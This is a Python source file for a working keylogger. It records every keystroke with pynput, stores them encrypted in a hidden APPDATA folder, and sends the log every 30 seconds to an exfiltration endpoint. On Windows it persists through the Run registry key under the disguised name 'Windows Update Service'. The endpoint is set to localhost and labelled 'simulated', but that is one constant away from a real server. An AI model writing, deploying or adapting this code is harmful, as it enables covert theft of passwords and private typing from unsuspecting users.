import os
import sys
import time
import threading
import base64
from cryptography.fernet import Fernet
from pynput import keyboard
import requests
import json

# === CONFIGURATION ===
LOG_DIR = os.path.join(os.getenv("APPDATA") or ".", ".syslogs")
LOG_FILE = os.path.join(LOG_DIR, "log.enc")
FERNET_KEY_FILE = os.path.join(LOG_DIR, "fernet.key")
EXFIL_URL = "http://localhost:5000/exfiltrate"  # Simulated remote server
KILL_COMBO = {keyboard.Key.ctrl_l, keyboard.Key.alt_l, keyboard.KeyCode(char='k')}
pressed_keys = set()

# === FERNET ENCRYPTION ===
def load_or_create_key():
    if not os.path.exists(FERNET_KEY_FILE):
        key = Fernet.generate_key()
        with open(FERNET_KEY_FILE, "wb") as f:
            f.write(key)
    else:
        with open(FERNET_KEY_FILE, "rb") as f:
            key = f.read()
    return Fernet(key)

fernet = load_or_create_key()

# === LOGGING ===
def encrypt_log(text):
    timestamped = f"{time.ctime()} | {text}"
    encrypted = fernet.encrypt(timestamped.encode())
    return encrypted

def save_log(data):
    os.makedirs(LOG_DIR, exist_ok=True)
    with open(LOG_FILE, "ab") as f:
        f.write(data + b"\n")

# === KEYLOGGER ===
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            log = encrypt_log(key.char)
        else:
            log = encrypt_log(str(key))
        save_log(log)

        # Detect kill switch
        if key in KILL_COMBO:
            pressed_keys.add(key)
            if pressed_keys == KILL_COMBO:
                print("[!] Kill combo detected. Exiting...")
                return False
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

# === SIMULATED EXFILTRATION ===
def exfiltrate():
    while True:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "rb") as f:
                content = f.read()
            try:
                # Simulate POST to a local server
                requests.post(EXFIL_URL, data={"data": base64.b64encode(content).decode()})
                print("[+] Data exfiltrated to localhost.")
            except:
                print("[!] Exfil failed. Server offline?")
        time.sleep(30)

# === STARTUP PERSISTENCE (Windows only) ===
def add_to_startup():
    if os.name != 'nt':
        return
    import winreg
    exe = sys.executable if sys.executable.endswith(".exe") else sys.argv[0]
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Windows Update Service", 0, winreg.REG_SZ, exe)
    winreg.CloseKey(key)

# === MAIN ===
def main():
    print("[*] Keylogger started.")
    add_to_startup()

    # Start exfiltration thread
    threading.Thread(target=exfiltrate, daemon=True).start()

    # Start keylogger
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
